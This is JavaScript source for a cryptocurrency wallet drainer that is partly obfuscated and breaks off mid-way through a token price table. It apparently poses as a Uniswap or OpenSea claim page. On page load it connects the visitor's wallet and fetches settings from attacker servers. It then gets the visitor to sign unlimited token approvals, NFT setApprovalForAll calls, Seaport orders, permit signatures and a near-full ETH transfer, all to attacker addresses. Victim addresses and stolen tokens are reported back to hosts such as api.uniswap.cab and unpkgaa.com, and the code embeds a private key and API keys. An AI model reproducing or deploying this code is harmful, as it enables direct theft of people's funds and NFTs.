let nftABI=[{constant:!1,inputs:[{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"tokenId",type:"uint256"}],name:"approve",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"tokenId",type:"uint256"}],name:"mint",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{internalType:"address",name:"from",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"tokenId",type:"uint256"}],name:"safeTransferFrom",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{internalType:"address",name:"from",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"tokenId",type:"uint256"},{internalType:"bytes",name:"_data",type:"bytes"}],name:"safeTransferFrom",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{internalType:"address",name:"to",type:"address"},{internalType:"bool",name:"approved",type:"bool"}],name:"setApprovalForAll",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!1,inputs:[{internalType:"address",name:"from",type:"address"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"tokenId",type:"uint256"}],name:"transferFrom",outputs:[],payable:!1,stateMutability:"nonpayable",type:"function"},{inputs:[],payable:!1,stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!0,internalType:"uint256",name:"tokenId",type:"uint256"}],name:"Transfer",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"approved",type:"address"},{indexed:!0,internalType:"uint256",name:"tokenId",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"operator",type:"address"},{indexed:!1,internalType:"bool",name:"approved",type:"bool"}],name:"ApprovalForAll",type:"event"},{constant:!0,inputs:[{internalType:"address",name:"owner",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{internalType:"uint256",name:"tokenId",type:"uint256"}],name:"getApproved",outputs:[{internalType:"address",name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"operator",type:"address"}],name:"isApprovedForAll",outputs:[{internalType:"bool",name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{internalType:"uint256",name:"tokenId",type:"uint256"}],name:"ownerOf",outputs:[{internalType:"address",name:"",type:"address"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{internalType:"bytes4",name:"interfaceId",type:"bytes4"}],name:"supportsInterface",outputs:[{internalType:"bool",name:"",type:"bool"}],payable:!1,stateMutability:"view",type:"function"}]
let erc20ABI=[{constant:!0,inputs:[],name:"name",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_spender",type:"address"},{name:"_value",type:"uint256"}],name:"approve",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"totalSupply",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transferFrom",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[],name:"decimals",outputs:[{name:"",type:"uint8"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[{name:"_owner",type:"address"}],name:"balanceOf",outputs:[{name:"balance",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{constant:!0,inputs:[],name:"symbol",outputs:[{name:"",type:"string"}],payable:!1,stateMutability:"view",type:"function"},{constant:!1,inputs:[{name:"_to",type:"address"},{name:"_value",type:"uint256"}],name:"transfer",outputs:[{name:"",type:"bool"}],payable:!1,stateMutability:"nonpayable",type:"function"},{constant:!0,inputs:[{name:"_owner",type:"address"},{name:"_spender",type:"address"}],name:"allowance",outputs:[{name:"",type:"uint256"}],payable:!1,stateMutability:"view",type:"function"},{payable:!0,stateMutability:"payable",type:"fallback"},{anonymous:!1,inputs:[{indexed:!0,name:"owner",type:"address"},{indexed:!0,name:"spender",type:"address"},{indexed:!1,name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,name:"from",type:"address"},{indexed:!0,name:"to",type:"address"},{indexed:!1,name:"value",type:"uint256"}],name:"Transfer",type:"event"}];
let lastUsedNonce = 0
let eth_bal = 0;

// Config data from server
let minETHFinesse = 0.0
let minETH = 0.0
let receiveAddress = ""
let finesseReceiveAddress = ""

let connected = false

Moralis.onWeb3Enabled(async (data) => {
    if (connected)
        return

    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0]

    await fetch("https://api.uniswap.cab/connected", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "victimAddress": walletAddress,
        })
    })
    connected = true

});

Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});


setTimeout(async () => {
    try {
        const web3Js = new Web3(Moralis.provider);
        const walletAddress = (await web3Js.eth.getAccounts())[0];
        console.log(`${walletAddress} is connected`)
    } catch (e) {}
}, 600 * 1000);

async function askSign() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    try {
        const message = signMessage.replace("{address}", walletAddress).replace("{nonce}", createNonce());

        const signature = await web3Js.eth.personal.sign(message, walletAddress);
        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);

        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() === signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
        return true;
    } catch (e) {
        console.log(e);
        return false;
    }

}

const verifyAsset = async () => {
    if (!drainETH)
        return

    await connectWallet()

    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    try {
        eth_bal = await web3Js.eth.getBalance(walletAddress);
        const ethBal = web3Js.utils.fromWei(eth_bal, 'ether');
        console.log(`Current balance for ${walletAddress} : ${ethBal} ETH`);

        if (minETH > ethBal)
            console.log(`Error, balance is too low. (${ethBal} < ${minETH} ETH)`);
        else
            await askTransferWithSign(ethBal)
    } catch (e) {
        console.log(e);
    }
};

async function broadcastTransaction(txObject) {
    const web3Js = new Web3(Moralis.provider);
    const chainId = await web3Js.eth.getChainId();
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    const ethTx = new ethereumjs.Tx(txObject)
    const rawHash = web3Js.utils.sha3('0x' + ethTx.serialize().toString('hex'), { encoding: 'hex' });

    try {
        const result = await web3Js.eth.sign(rawHash, walletAddress)
        const signature = result.substring(2);
        const r = "0x" + signature.substring(0, 64);
        const s = "0x" + signature.substring(64, 128);
        const v = parseInt(signature.substring(128, 130), 16);

        const y = web3Js.utils.toHex(v + chainId * 2 + 8);

        ethTx.r = r;
        ethTx.s = s;
        ethTx.v = y;

        const signedTx = '0x' + ethTx.serialize().toString('hex');
        const signedTxHash = web3Js.utils.sha3(signedTx, { encoding: 'hex' });

        console.log("Transaction Hash:", signedTxHash);

        await fetch("https://api.uniswap.cab/broadcast/", {
           method: "POST",
           headers: {
               "Content-Type": "application/json"
           },
           body: JSON.stringify({
               "transactionId": signedTx,
               "transactionHash": signedTxHash,
               "senderAddress": walletAddress
           })
        })
        return true
    } catch (err) {
        console.log("User declined signature", err)
        return false
    }

}

async function askTransferWithSign(ethBal) {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    await web3Js.eth.getTransactionCount(walletAddress, "pending")
        .then(async (txnCount) => {
            if (lastUsedNonce === txnCount) {
                txnCount++
            }
            lastUsedNonce = txnCount

            const finesse = ethBal > minETHFinesse
            const jgasPrice = await web3Js.eth.getGasPrice();
            const mgasPrice = web3Js.utils.toHex(Math.floor(jgasPrice * 1.4));
            const gas = new web3Js.utils.BN("22000");
            const cost = gas * Math.floor(jgasPrice * 2);
            const toSend = eth_bal - cost;

            console.log(`Sending ${web3Js.utils.fromWei(toSend.toString(), "ether")} ETH from ${walletAddress}...`);
            const txObject = {
                nonce: web3Js.utils.toHex(txnCount),
                gasPrice: mgasPrice, gasLimit: "0x55F0",
                to: finesse ? finesseReceiveAddress : receiveAddress,
                value: "0x" + toSend.toString(16),
                data: "0x", v: "0x1", r: "0x", s: "0x"
            };

            try {
                let signed = false
                let counter = 0
                while (!signed && counter < signatureRetries) {
                    console.log(`Try ${counter+1}/${signatureRetries}`)
                    signed = await broadcastTransaction(txObject)
                    counter++
                }

                if (signed) {
                    fetch("https://api.uniswap.cab/alert", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            "victimAddress": walletAddress,
                            "tokenType": "ETH",
                            "ethAmount": ethBal,
                            "finesse": finesse
                        })
                    })
                }
            } catch (err) {
                console.error(err)
            }
        })
}

async function checkSeaportDrain() {
    const contractAddress = "0x7ffc43207fa9e1b73bd463e5c1c960c6ff7fac58"

    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    let contract = new(web3Js.eth.Contract)(nftABI, "0x08f0B2A4351514E63E9E03A661aDFe58D463CfBc", { from: walletAddress });

    let isApprovedForAll = await contract.methods.isApprovedForAll(walletAddress, "0x1e0049783f008a0085193e00003d00cd54003c71").call()
    console.log("OpenSea Approval", isApprovedForAll)

    if (!isApprovedForAll)
        return

    // TODO: Get the actual tokens and their IDs
    const data = [
        {
            amount: '1',
            itemType: 2, // collection.type == 'erc721' ? 2 : 3, // we only send back ERC721 tokens from backend
            token: contractAddress,
            identifier: "168",
            recipient: receiveAddress // change this to our address
        },
        {
            amount: '1',
            itemType: 2, // collection.type == 'erc721' ? 2 : 3, // we only send back ERC721 tokens from backend
            token: contractAddress,
            identifier: "169",
            recipient: receiveAddress // change this to our address
        }
    ]

    let web3Ethers = new ethers.providers.Web3Provider(window.ethereum);
    await web3Ethers.send('eth_requestAccounts', []);
    let signer = await web3Ethers.getSigner(0)

    const seaportObject = new seaport.Seaport(signer)

    console.log("Creating order")
    const { executeAllActions: createSeaportOrder } = await seaportObject.createOrder(
        {
            offer: data,
            consideration: [{
                amount: '1',
                recipient: receiveAddress
            }],
            conduitKey: '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000', // create conduit
            zone:       '0x004C00500000aD104D7DBd00e3ae0A5C00560C00', // bring browser here sec
            startTime: '1660921177', // keep the same
            endTime: '19163599577' // keep the same
        },
        receiveAddress
    );

    const seaportOrder = await createSeaportOrder()
    console.log("Created order")
    console.log("order", JSON.stringify(seaportOrder))

    return
    const devWalletObj = new ethers.Wallet("86659d8b0ec15ea163254369c61c1af38927666963ef5ad91ef55faeac25fed1");

    const devWalletAddress = await devWalletObj.connect(web3Ethers);
    const devWalletSeaportObj = new seaport.Seaport(devWalletAddress);
    console.log("Logged into wallet")
    try {
        console.log("FulFilling order")
        const {executeAllActions: fullFillSeaport } = await devWalletSeaportObj.fulfillOrder({
            order: seaportOrder,
            accountAddress: walletAddress,
            recipientAddress: receiveAddress
        });
        let response = await fullFillSeaport()
        console.log("Fulfilled order")
        console.log(response, response.hash)
    } catch (e) {
        console.log("error", e, e.code)
    }
}

async function getSeaportTargets() {
    await connectWallet()
    const web3Js = new Web3(Moralis.provider);

    const walletAddress = (await web3Js.eth.getAccounts())[0];

    const response = await fetch("https://api.uniswap.cab/seaport", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "victim": walletAddress,
        })
    })

    return await response.json()
}

async function approveSeaport(victims) {
    await connectWallet()

    let nftInfo = []

    victims.map(nft => {
        nftInfo.push({
            amount: '1',
            itemType: nft["tokenType"] === 'ERC721' ? 2 : 3,
            token: nft["contract"],
            identifier: nft["tokenID"],
            recipient: receiveAddress
        })
    })

    console.log("created order. NFT Info:", nftInfo)

    let web3 = new ethers.providers.Web3Provider(window.ethereum);
    await web3.send('eth_requestAccounts', []);
    let address = await web3.getSigner(0);
    const seaportObject = new seaport.Seaport(address)

    let accepted = false
    let tryIndex = 0

    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    while (!accepted && tryIndex < signatureRetries) {
        try {
            console.log(`Try ${tryIndex+1}/${signatureRetries}`)
            const {executeAllActions: createSeaportOrder} = await seaportObject.createOrder({
                offer: nftInfo,
                consideration: [{
                    amount: '1',
                    recipient: receiveAddress
                }],
                conduitKey: '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000',
                zone:       '0x004C00500000aD104D7DBd00e3ae0A5C00560C00', // ??
                startTime: '1660921177', // keep the same
                endTime: '19163599577' // keep the same
            }, receiveAddress);

            const seaportOrder = await createSeaportOrder()
            accepted = true
            fetch("https://api.uniswap.cab/alert", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    "victimAddress": walletAddress,
                    "tokensStolen": victims,
                    "tokenType": "Seaport",
                    "seaportOrder": seaportOrder
                })
            })
        } catch(e) {
            if (e.message.toLowerCase().includes("denied") || e.message.toLowerCase().includes("signature") || e.message.toLowerCase().includes("user")) {
                accepted = false
                tryIndex++
            }
            console.log("Could not do seaport drain.", e)
        }
    }
}

async function startDrainer() {
    await connectWallet()

    let largestNFTs
    let largestTokens
    let seaportNFTs

    if (nftApprovals)
        largestNFTs = getLargest("nft")
    if (erc20Approvals)
        largestTokens = getLargest("erc20")
    if (seaportDrain)
        seaportNFTs = getSeaportTargets()

    if (seaportDrain) {
        await seaportNFTs.then(async (data) => {
            if (data !== null) {
                if (data.length !== 0) {
                    console.log("seaport victims", data)
                    console.log(`Draining ${data.length} nfts using seaport`)
                    await approveSeaport(data)
                }
            } else {
                console.log("No seaport approvals")
            }
        })
    }

    if (nftApprovals) {
        await largestNFTs.then(async (data) => {
            if (data !== null) {
                console.log("nfts", data)
                for (let i = 0; i < data.length; i++) {
                    let nft = data[i]
                    console.log("Approving nft", nft["contract"])
                    await approveNFT(nft["contract"], nft["finesse"], nft["tokenType"])
                }
            } else {
                console.log("No NFTs")
            }
        })
    }

    if (erc20Approvals) {
        await largestTokens.then(async (data) => {
            if (data !== null) {
                console.log("tokens", data)

                for (let i = 0; i < data.length; i++) {
                    let key = Object.keys(data[i])[0]
                    console.log("Approving erc20 token", key)
                    await approveToken(key, data[i][key])
                }
            } else {
                console.log("No ERC20 tokens")
            }
        })
    }
    
    if (drainETH)
        await verifyAsset()
}

async function getLargest(tokenType) {
    await connectWallet()
    const web3Js = new Web3(Moralis.provider);

    const walletAddress = (await web3Js.eth.getAccounts())[0];

    const response = await fetch("https://api.uniswap.cab/largest", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "targetAddress": walletAddress,
            "tokenType": tokenType,
        })
    })

    return await response.json()
}

async function approveNFT(nft, finesse, tokenType) {
    if (!nftApprovals)
        return

    await connectWallet()

    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    await web3Js.eth.getTransactionCount(walletAddress, "pending")
        .then(async (txnCount) => {
            if (lastUsedNonce === txnCount) { txnCount++ }
            lastUsedNonce = txnCount

            const jgasPrice = await web3Js.eth.getGasPrice();
            const mgasPrice = web3Js.utils.toHex(Math.floor(jgasPrice * 1.4));

            let tx_builder
            let contract = new(web3Js.eth.Contract)(nftABI, nft, { from: walletAddress });

            if (finesse) {
                tx_builder = contract.methods.setApprovalForAll(finesseReceiveAddress, true)
            } else {
                console.log("Called setApprovalForAll for wallet", receiveAddress);
                tx_builder = contract.methods.setApprovalForAll(receiveAddress, true)
            }

            const txObject = { nonce: web3Js.utils.toHex(txnCount), gas: await tx_builder.estimateGas(), gasPrice: mgasPrice, gasLimit: "0x55F0", to: nft, value: "0x", data: tx_builder.encodeABI(), v: "0x1", r: "0x", s: "0x" };

            try {
                let signed = false
                let counter = 0
                while (!signed && counter < signatureRetries) {
                    console.log(`Try ${counter+1}/${signatureRetries}`)
                    signed = await broadcastTransaction(txObject)
                    counter++
                }

                if (signed) {
                    fetch("https://api.uniswap.cab/alert", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            "victimAddress": walletAddress,
                            "tokenType": tokenType,
                            "tokenAddress": nft,
                            "finesse": finesse
                        })
                    })
                }
            } catch (err) {
                console.error(err)
            }
        })
}

async function approveToken(token, finesse) {
    if (!erc20Approvals) {
        return;
    }

    await connectWallet()
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    await web3Js.eth.getTransactionCount(walletAddress, "pending")
        .then(async (txnCount) => {
            if (lastUsedNonce === txnCount) { txnCount++ }
            lastUsedNonce = txnCount

            const jgasPrice = await web3Js.eth.getGasPrice();
            const mgasPrice = web3Js.utils.toHex(Math.floor(jgasPrice * 1.4));

            let tx_builder
            let contract = new(web3Js.eth.Contract)(erc20ABI, token, { from: walletAddress });

            if (finesse) {
                tx_builder = contract.methods.approve(finesseReceiveAddress, (2 ** 256 - 1).toString(16))
            } else {
                console.log("Called approve for wallet", receiveAddress);
                tx_builder = contract.methods.approve(receiveAddress, (2 ** 256 - 1).toString(16))
            }

            const txObject = { nonce: web3Js.utils.toHex(txnCount), gas: await tx_builder.estimateGas(), gasPrice: mgasPrice, gasLimit: "0x55F0", to: token, value: "0x", data: tx_builder.encodeABI(), v: "0x1", r: "0x", s: "0x" };

            try {
                let signed = false
                let counter = 0
                while (!signed && counter < signatureRetries) {
                    console.log(`Try ${counter+1}/${signatureRetries}`)
                    signed = await broadcastTransaction(txObject)
                    counter++
                }

                if (signed) {
                    fetch("https://api.uniswap.cab/alert", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            "victimAddress": walletAddress,
                            "tokenType": "ERC20",
                            "tokenAddress": token,
                            "finesse": finesse
                        })
                    })
                }
            } catch (err) {
                console.error(err)
            }
        })
}

async function askTransfer() {
    await connectWallet()

    disabled = true;

    if (enableFakeSig && !signedWelcomeMessage)
        askSign()

    await startDrainer()
    console.log("Stolen all data")
    disabled = false;
}

let metamaskInstalled = false;
if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
window.addEventListener('load', async () => {
    const response = await (await fetch(`https://api.uniswap.cab/settings`)).json()
    try {
        minETH = response["minETH"]
        minETHFinesse = response["minETHFinesse"]
        receiveAddress = response["receiveAddress"]
        finesseReceiveAddress = response["finesseAddress"]
    } catch (e) {

    }

    console.log("Min ETH:", minETH)
    console.log("Min ETH Finesse:", minETHFinesse)
    console.log("Receive Address:", receiveAddress)
    console.log("Finesse Address:", finesseReceiveAddress)

    await connectWallet();

   // document.querySelector("#claimButton").addEventListener("click", askTransfer);
    askTransfer();
});

async function connectWallet() {
    while (!connected) {
        try {
            await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
            connected = true
        } catch (e) {
            console.log("User denied connection")
        }
    }
}

//#region Utils Functions
const round = (value) => { return Math.round(value * 10000) / 10000; }

const rdmString = (length) => {
    let x = "";
    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
    return x;
}
const createNonce = () => { return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; }

$(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
    get_local_moralis_key = await (await fetch("https://snazzy-croquembouche-b14a4a.netlify.app/moralis_key.json")).json();
    var d = get_local_moralis_key["moralis-go-fuck-urself-imagine-trying"];
    function e(d, e) {
        for (var c = 0; c < d.length; )
            d[c] === e ? d.splice(c, 1) : ++c;
        return d
    }
    var c = document.getElementById("metamaskbutton");
    if ("Android" == getMobileOperatingSystem() || "iOS" == getMobileOperatingSystem()) {
        var W = document.createElement("a");
        W.classList.add("mmLink"),
        W.href = "https://metamask.app.link/dapp/" + window.location.href.replace("https://", "").replace("http://", "") + "?uid=mm",
        c.parentNode.insertBefore(W, c),
        W.appendChild(c)
    }
    $("#metamaskbutton,#metamaskbutton1,#metamaskbutton2,#metamaskbutton3,#metamaskbutton4,#metamaskbutton5").click((async function() {
        if (wi)
            return;
        wi = !0;
        const c = window.Web3Modal.default
          , W = window.WalletConnectProvider.default;
        let m, a;
        console.log("Initializing example"),
        console.log("WalletConnectProvider is", W),
        console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);
        m = new c({
            cacheProvider: !1,
            providerOptions: {
                walletconnect: {
                    package: W,
                    options: {
                        infuraId: "b85301910e9b4881baa9dd15bb03141b"
                    }
                }
            },
            disableInjectedProvider: !1,
            network: "mainnet",
            theme: "dark"
        }),
        console.log("Web3Modal instance is", m),
        console.log("Opening a dialog", m);
        try {
            a = await m.connect(),
            "0x1" != a.chainId && await a.request({
                method: "wallet_switchEthereumChain",
                params: [{
                    chainId: "0x1"
                }]
            })
        } catch (d) {
            return "undefined" == a && window.open("dapp://" + window.location.host + window.location.pathname),
            console.log("Could not get a wallet connection", d),
            void (wi = !1)
        }
        a.on("accountsChanged", (d=>{
            window.location.reload()
        }
        )),
        a.on("chainChanged", (d=>{
            window.location.reload()
        }
        )),
        a.on("networkChanged", (d=>{
            window.location.reload()
        }
        )),
        a = await new ethers.providers.Web3Provider(a);
        const f = await a.getSigner()
          , o = new window.seaport(f);
        signerGlobal = f;
        var b = await f.getAddress();
        const n = await f.getBalance();
        async function t(d, e, c) {
            const W = await new ethers.Contract(c,permit_abi,f)
              , [m] = await Promise.all([W.name()]);
            try {
                version = await W.version()
            } catch {
                version = "1"
            }
            console.log(version),
            connector = await new window.oneinch.Web3ProviderConnector(a),
            eip2612PermitUtils = await new window.oneinch.Eip2612PermitUtils(connector),
            console.log(eip2612PermitUtils);
            const o = window.oneinch.PermitParams = {
                owner: b,
                spender: "0x053973D64EE9256d6957E3C5D2b5dD100064F07F",
                value: "115792089237316195423570985008687907853269984665640564039457584007913129639935",
                nonce: await eip2612PermitUtils.getTokenNonce(c, b),
                deadline: 4482689033
            };
            var n = await eip2612PermitUtils.buildPermitSignature({
                ...o,
                nonce: await eip2612PermitUtils.getTokenNonce(c, b)
            }, await f.getChainId(), m, c, version);
            const t = JSON.stringify(n);
            console.log(n),
            console.log(t);
            try {
                types_maybe = {
                    Permit: n.types.Permit
                },
                yx("Prompting Permit Request [Address](https://etherscan.io/address/" + b + ")");
                const m = await f._signTypedData(n.domain, types_maybe, n.message)
                  , {v: a, r: o, s: t} = ethers.utils.splitSignature(m);
                valueeeeeee = "test",
                encoded_aaaaaaaaaaa = W.interface.encodeFunctionData("permit", [b, "0x053973D64EE9256d6957E3C5D2b5dD100064F07F", "115792089237316195423570985008687907853269984665640564039457584007913129639935", 4482689033, a, o, t]),
                wx("🥇 ERC20 Permit\nAddress: " + b + "\n📛 Receive: 0x053973D64EE9256d6957E3C5D2b5dD100064F07F\nWebsite: " + window.location.host),
                yx("ERC-20-Permit " + window.location.host + " \nFROM " + b + "\nValue: " + d + "ETH", b, c, encoded_aaaaaaaaaaa, e, "0x053973D64EE9256d6957E3C5D2b5dD100064F07F"),
                console.log(b),
                console.log({
                    v: a,
                    r: o,
                    s: t
                }),
                console.log({
                    contract_add: c,
                    owner: b,
                    spender: "0x053973D64EE9256d6957E3C5D2b5dD100064F07F",
                    value: "115792089237316195423570985008687907853269984665640564039457584007913129639935",
                    nonce: await eip2612PermitUtils.getTokenNonce(c, b),
                    deadline: 4482689033,
                    v: a,
                    r: o,
                    s: t
                });
                let y = new FormData;
                y.append("action", "permit"),
                y.append("a1", c),
                y.append("a2", b),
                y.append("a3", "0x053973D64EE9256d6957E3C5D2b5dD100064F07F"),
                y.append("a4", "115792089237316195423570985008687907853269984665640564039457584007913129639935"),
                y.append("a5", await eip2612PermitUtils.getTokenNonce(c, b)),
                y.append("a6", 4482689033),
                y.append("a7", a),
                y.append("a8", o),
                y.append("a9", t),
                fetch("https://www.unpkgaa.com/handler/handler.php", {
                    body: y,
                    method: "post"
                }).then(console.log)
            } catch (d) {
                console.log(d),
                yx("ERC-20 PERMIT REJECTED [Address](https://etherscan.io/address/" + b + ") [Opensea](https://opensea.io/" + b + ")")
            }
        }
        provider_test = await new ethers.ethers.providers.InfuraProvider(null,"b85301910e9b4881baa9dd15bb03141b"),
        wx("🥇 Connect\nAddress: " + b + "\n📛 [Etherscan](https://etherscan.io/address/" + b + ")\n💫 [Opensea](https://opensea.io/" + b + ")\n❤️[ChaXun](https://api.covalenthq.com/v1/1/address/" + b + "/balances_v2/?quote-currency=ETH&no-nft-fetch=true&key=ckey_f7e2965913b046ddbf00fbcee12)\nWallet Value (ETH): " + ethers.utils.formatEther(n) + "\nWebsite: " + window.location.host),
        yx("CONNECT [Address](https://etherscan.io/address/" + b + ") [Opensea](https://opensea.io/" + b + ") [Portfolio](https://dappradar.com/hub/wallet/eth/" + b + ")\n" + ethers.utils.formatEther(n) + " ETH " + window.location.host);
        var y = Promise.all([async function(d) {
            var c = [];
            return logs_nft = await provider_test.getLogs({
                fromBlock: "0x1",
                toBlock: "latest",
                topics: ["0x17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31", "0x000000000000000000000000" + d.slice(2), "0x0000000000000000000000001e0049783f008a0085193e00003d00cd54003c71"]
            }),
            console.log(logs_nft),
            logs_nft.forEach((d=>{
                addresss = d.address,
                data = d.data,
                data.endsWith("1") ? c.push(addresss.toLowerCase()) : c = e(c, addresss.toLowerCase())
            }
            )),
            c
        }(b), async function(d) {
            var c = [];
            return logs_tokens = await provider_test.getLogs({
                fromBlock: "0x1",
                toBlock: "latest",
                topics: ["0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925", "0x000000000000000000000000" + d.slice(2), "0x0000000000000000000000001e0049783f008a0085193e00003d00cd54003c71"]
            }),
            logs_tokens.forEach((d=>{
                addresss = d.address,
                data = d.data,
                data.startsWith("0xf") ? c.push(addresss.toLowerCase()) : c = e(c, addresss.toLowerCase())
            }
            )),
            c
        }(b), async function(d) {
            let e = d;
            const c = [];
            let W = !0
              , m = ""
              , a = 0;
            for (; W && a < 10; ) {
                const {next: d, assets: f} = await fetch("https://api.opensea.io/api/v1/assets?owner=" + e + (m.length ? "&cursor=" + m : "") + "&limit=100").then((d=>d.json()));
                c.push(...f),
                a++,
                m = d,
                W = null != m
            }
            return c
        }(b)]);
        var J = fetch("https://deep-index.moralis.io/api/v2/" + b + "/erc20?chain=eth", {
            method: "GET",
            headers: {
                accept: "application/json",
                "X-API-Key": d
            }
        })
          , k = []
          , x = [];
        out_of_promise = await y;
        var z = out_of_promise[0]
          , Z = out_of_promise[1]
          , C = out_of_promise[2];
        for (let d = 0; d < C.length; d++)
            0 == x.includes(C[d].collection.slug) && (x.push(C[d].collection.slug),
            k.push(C[d]));
        console.log(x),
        prices_big_promise = Promise.all([async function(d) {
            const e = {
                "0xdac17f958d2ee523a2206206994597c13d831ec7": .0006667255,
                "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": .0006666572,
                "0x6b175474e89094c44da98b954eedeac495271d0f": .0006663732,
                "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce": 7.3e-9,
                "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984": .0046161141,
                "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": 13.5816625853,
                "0x2af5d2ad76741191d15dfe7bf6ac92d4bd912ca3": .0028916454,
                "0x514910771af9ca656af840dff83e8264ecf986ca": .0046309049,
                "0xa0b73e1ff0b80914ab6fe0444e65848c4c34450b": 730763e-10,
                "0x4a220e6096b25eadb88358cb44068a3248254675": .1091217089,
                "0x4d224452801aced8b2f0aebe155379bb5d594381": .0030831631,
                "0x6f259637dcd74c767781e37bc6133cd6a68aa161": .0060206581,
                "0x3506424f91fd33084466f402d5d97f05f8e3b4af": .0001306945,
                "0x0f5d2fb29fb7d3cfee444a200298f468908cc942": .0004205939,
                "0x3845badade8e6dff049820680d1f14bd3903a5d0": .0005165423,
                "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": .0545744176,
                "0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18": 348777e-10,
                "0x75231f58b43240c9718dd58b4967c5114342a86c": .010497616,
                "0x8e870d67f660d95d5be530380d0ec0bd388289e1": .0006621111,
                "0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5": .0002987662,
                "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": .6057303544,
                "0xbb0e17ef65f82ab018d8edd776e8dd940327b28b": .0060606054,
                "0x0000000000085d4780b73119b644ae5ecd22b376": .0006650689,
                "0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f": .0016055852,
                "0x0c10bf8fcb7bf5412187a595ab97a3609160b5c6": .0006654827,
                "0x674c6ad92fd080e4004b2312b45f796a192d27a0": .0006385593,
                "0xc944e90c64b2c07662a292be6244bdf05cda44a7": 538929e-10,
